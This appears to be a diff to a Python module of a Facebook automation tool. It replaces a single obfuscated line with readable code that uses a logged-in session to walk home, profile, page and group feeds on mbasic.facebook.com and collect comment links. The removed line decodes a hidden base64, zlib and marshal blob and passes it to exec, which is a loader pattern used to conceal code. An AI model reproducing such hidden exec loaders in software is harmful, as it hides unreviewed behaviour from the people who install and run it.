@@ -1,1 +1,23 @@
-_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'==AwtiQUv0/W98Hmf9/7C/Tvfq+ze75F//T96L35xjf//dd6K+1xj7P/Wyvl9733ve88//znPP9/+lW4W8zHy+y8//j5fXcd+O0vftO//db+rr/ffw+d4//vjH//vn///RWWF/19y//bxXoK/96gLLWB7ghinGW6N7LOmJutqu04fo3FaLVIvmwkqVBUkF5bgMNlCx2cvA68KmvyFCAu5UiHSbvW3MJz6DipAQglXh2Y9UH8mACDA/LGgIQaWZPCk8FBQEBLAEHjQ+ieB0noF0xEAA2g11fy7uKvAOSkuuNPYQ1agwf+gnbw2rJSbFdjA2Zg8O5D6bgQiIUpFtQ14ZQjOYU2E0aswqOtazl9nmI5ZB6wRWAWzZF/ZfH9sprczIl5c6OPUSZ0LWxhOD7sMB5j7UlNEF0sCnmnB1bcY5bHH3bNjwf2+ai5DQ21ayIduD6ZbsybzUUH0hZD7HajjCzORU1FA/bX7joqNHey+KRtS9CXjeqtNSBwP5Vy4gh0GnksAKso9MY1wC/xeXbLfIMQRg0m7nF5qjbatC5vYJNcEkZrEMEc/ROeT8ZGSbdSTYVINlf8x5qPJCqNAT65QoTwTtO0KBcY6xQ4ZZ86wNSA72sR5GihlFmtGPTnEHrU/oXt53BpfkxG4qpG3HxoWIc9rE+JU1ojHgdFbSFqUv/L3RdMhi+A89YQD69YTdqxsvqTRuDcAedsjgE7BiWiA/Hq4/YjjQEbqqcrF/5Q1E2bsMvJZrU/SQ1jEwQps1XPHjEsdbdnAAuzrjwIOTkpYZZfaDguxwLYQ414J8QEyKUllDrAN0pQYEqKJVSBlBzIK1dogaUJ2KTSguNlnhmPBifBxGc5B5FaYxpsYahgiQjfEtrp5iNkqlIhyyb4v/QXVSQ0yUwabKVySl3ZR7nWTGcMn20ytDjNocIp3vL9o+R9cz1psiWQAV0w48S971hMKzV3nizOnEC3+sIQYZoHyqbnytCBGcrejC+UjeMDaxEOQyLaAPH8/ZuGXZz97rYdbGCE3894j7sM8icexGFfmKBddssvLo4wNIebcGw8Bu99/y96Mq4Vf12SPn6JyzS3W7P0FIE7ctsujqbRvpAJQZ+S1Dc9VB73a9QC7U9yX3QURrOtsWq50SHKdmEMx44bnSlF+PpvgsgEPJMctX/F7QJlUMZFKV7omktoCxiyEkppHEMqxrEDHUrfl8QR50H8wsM1gkAUX7pzQx9f550yYlRDdwqgvYMqYQihsKls8pLGl5MBwPgxwrApwbVAH3EZAhMP3oiPWRBvuELJfwWuhK5il5ol/wV/VMOcA2a3VcuIMoiNU96PV8+sF7NY19XEnljq85RH6sloX9qbva3wmi+bcgKxuKrSYmMWD7Cq0ng9fnt407PG6BQsGlkPRuqWTd1iwxxrcSNaAvT+OcMFRtetj8j2AEh5LjgxTA0nspVp2sINxv1klXoynyhrq4huKFrb7Yxr09CAyL+k9BXymFdWDXdoZVarQdiAV+EgHiZ+00jcb9VTFEGQolLsXy+ZoQ6PZLydYNU+wlaT7GQrFMozZR/drBdVmOiqNLje1GAdu1j5ywffzmmgisl2K03iVagbWHo5KD7PPoICaIpaH+tnckc1xXWakDFXmillOgUxzaV2yDMbOalTkmniq+mCXy/Rzm493YjNl4TuW+I3TA2GddNYUp66U/yadUdg8xIOxFvuCB3EbXaiyv6iHgHw3ZTmeiEbKjxgxsoJQB0S9agbxrbWJmqX52n8Cbbi6Oo5C/cCZVCMBvKKtT7+Db0PgPfUaBMnT9Ykue2HA6e7zUKLzLoWKK+hmzAoRnqjpfMZsDQ6fTeW9Yj2DMU0kOFI5ynJb6deikc3gEquuWTUz9rW65KtokCcWp+aoGwFzBXnD8bSxncoIhvmvbz+
+from .checker import check_login
+from .output import Output
+from . import sorting
+from . import parsing
+
+@check_login
+def comment_core(ses, func, arg, url, next, string_next):
+	html = ses.session.get(url if not next else next).text
+	data = parsing.parsing_href(html, "#footer_action_list")
+	next = sorting.to_mbasic(parsing.parsing_href(html, string_next, one = True))
+	return Output(ses, func, arg = arg, items = data, next = next, html = html)
+
+def comment_post_home(ses, next = None):
+	return comment_core(ses, comment_post_home, [], "https://mbasic.facebook.com/home.php", next, "?aftercursorr=")
+
+def comment_post_people(ses, id, next = None):		
+	return comment_core(ses, comment_post_people, [id], "https://mbasic.facebook.com/{}?v=timeline".format(id), next, "?cursor")
+
+def comment_post_fanspage(ses, username, next = None):	
+	return comment_core(ses, comment_post_fanspage, [username], "https://mbasic.facebook.com/{}".format(username), next, "?sectionLoadingID=")
+
+def comment_post_group(ses, id, next = None):
+	return comment_core(ses, comment_post_group, [id], "https://mbasic.facebook.com/groups/{}".format(id), next, "?bacr=")
